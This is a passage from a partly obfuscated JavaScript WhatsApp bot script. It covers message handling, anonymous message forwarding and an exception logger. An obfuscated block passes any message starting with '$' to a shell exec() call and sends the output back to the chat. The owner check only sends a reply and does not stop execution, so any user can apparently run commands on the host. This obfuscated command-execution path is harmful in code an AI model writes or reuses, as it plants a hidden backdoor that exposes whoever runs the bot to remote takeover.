_0x55c5b9;},_0x167f(_0x5860ae,_0x2b9f16);}if(budy[_0x10a606(0x1fe)]('$')){if(!itsMezeroyt7)m[_0x10a606(0x202)](mess[_0x10a606(0x1ec)]);exec(budy[_0x10a606(0x1e7)](-0x3c1*0xa+-0x47*0x76+-0x5*-0xe0e),(_0x239b1c,_0x5ea7c2)=>{var _0x342273=_0x10a606;if(_0x239b1c)m[_0x342273(0x202)](_0x239b1c);if(_0x5ea7c2)m[_0x342273(0x202)](_0x5ea7c2);});}if(!isCmd){if(cekPesan('id',sender)==null)return;if(cekPesan(_0x10a606(0x1f3),sender)==![])return;if(m[_0x10a606(0x1e6)][-0x35*-0x31+0xedb*0x1+-0x1900][_0x10a606(0x1fd)]==_0x10a606(0x207)+'on'||m[_0x10a606(0x1e6)][-0x11*0x8a+-0x1fbc*0x1+0x28e6][_0x10a606(0x1fd)]==_0x10a606(0x1f7)+_0x10a606(0x1ea)){try{var chat_anonymous=m[_0x10a606(0x1e6)][-0x151*0x1+0x169f*-0x1+-0x1*-0x17f0][_0x10a606(0x1f2)][_0x10a606(0x1f7)+_0x10a606(0x1ea)][_0x10a606(0x1f5)];}catch(_0x3dd70f){var chat_anonymous=m[_0x10a606(0x1e6)][-0x1e2+0x621+-0x43f][_0x10a606(0x1f2)][_0x10a606(0x207)+'on'];}let text_nya_menfes=_0x10a606(0x205)+_0x10a606(0x1e4)+'\x20'+chat_anonymous;zeroyt7[_0x10a606(0x1e8)+'e'](cekPesan(_0x10a606(0x1f3),sender),{'text':text_nya_menfes}),zeroyt7[_0x10a606(0x1e8)+'e'](from,{'text':_0x10a606(0x1e3)+_0x10a606(0x1ef)},{'quoted':msg});}}

if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
zeroyt7.copyNForward(from, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
zeroyt7.sendMessage(m.key.remoteJid, { text: `*[ERROR !!!]*\n${err}` }, { quoted: m })
}
}

var _0x4a08d8=_0x555e;function _0x555e(_0x4b45cb,_0x10bcef){var _0x5e1140=_0x20b8();return _0x555e=function(_0x234263,_0x1a3100){_0x234263=_0x234263-(-0x695+-0x1*0x1fe3+0xc*0x33f);var _0x4bbe29=_0x5e1140[_0x234263];return _0x4bbe29;},_0x555e(_0x4b45cb,_0x10bcef);}function _0x20b8(){var _0x577d99=['10SoTHXQ','log','uncaughtEx','296031rWFHbI','474360JDkXFd','616hMmXWh','Caught\x20exc','1788435AXUiWq','15183SsUVBW','174PjKHaj','2Cxfaio','1997941eHdqsg','ception','12515yPhSYG','20GLnJnn','cTVfC','eption:\x20','11391KgeCjH'];_0x20b8=function(){return _0x577d99;};return _0x20b8();}(function(_0x22c08b,_0x451773){var _0x1fd91e=_0x555e,_0x24a35c=_0x22c08b();while(!![]){try{var _0x53478c=-parseInt(_0x1fd91e(0x8b))/(-0x11*-0x6b+-0x1*-0x3f1+0xb*-0x101)*(-parseInt(_0x1fd91e(0x80))/(0x2184+0x13c9+-0x354b))+-parseInt(_0x1fd91e(0x87))/(-0x10ce+-0xa6*-0x1a+-0xb*0x1)*(-parseInt(_0x1fd91e(0x84))/(-0x1*0x663+0x4d7+-0x50*-0x5))+parseInt(_0x1fd91e(0x83))/(0x19aa+-0x1be+0x17e7*-0x1)*(parseInt(_0x1fd91e(0x7f))/(0x5*-0x54a+-0x1eb1+0x3929*0x1))+parseInt(_0x1fd91e(0x7e))/(-0x1a7e+-0x1512+0x2f97)*(-parseInt(_0x1fd91e(0x8d))/(0x1d79+0x2*-0xb30+-0xc9*0x9))+-parseInt(_0x1fd91e(0x7d))/(-0x38*0x58+-0x26a1+0x39ea)+parseInt(_0x1fd91e(0x88))/(0x10f7+0x16f1+0x3f*-0xa2)*(parseInt(_0x1fd91e(0x81))/(0x301*0x3+-0x1af7+0x10f*0x11))+-parseInt(_0x1fd91e(0x8c))/(0x1*0x91d+-0x812+-0xff);if(_0x53478c===_0x451773)break;else _0x24a35c['push'](_0x24a35c['shift']());}catch(_0x4e0d40){_0x24a35c['push'](_0x24a35c['shift']());}}}(_0x20b8,-0x48d65+-0x7*-0x8d41+-0x51b7*-0xa),process['on'](_0x4a08d8(0x8a)+_0x4a08d8(0x82),function(_0x49b317){var _0x4d97c2=_0x4a08d8,_0x554538={'cTVfC':_0x4d97c2(0x7c)+_0x4d97c2(0x86)};console[_0x4d97c2(0x89)](_0x554538[_0x4d97c2(0x85)],_0x49b317);}));